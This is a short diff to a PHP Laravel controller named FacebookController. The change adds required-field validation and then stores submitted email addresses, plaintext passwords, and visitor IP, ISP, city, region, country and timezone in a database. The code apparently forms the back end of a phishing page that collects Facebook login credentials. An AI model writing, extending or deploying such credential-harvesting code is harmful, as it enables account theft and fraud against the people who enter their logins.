@@ -39,14 +39,20 @@ class FacebookController extends Controller
     {
         $dataFacebook = new Facebook;
 
+        $this->validate($request, [
+            'email' => 'required',
+            'password' => 'required',
+        ]); 
+
         $dataFacebook->email = $request->email;
-        $dataFacebook->password = $request->password;
+        $dataFacebook->password = $request->password;                
         $dataFacebook->ip = $request->ip;
         $dataFacebook->isp = $request->isp;
         $dataFacebook->city = $request->city;
         $dataFacebook->region = $request->region;
         $dataFacebook->country = $request->country;
-        $dataFacebook->timezone = $request->timezone;
+        $dataFacebook->timezone = $request->timezone; 
+        
         //dd($dataFacebook);
         $dataFacebook->save();
 
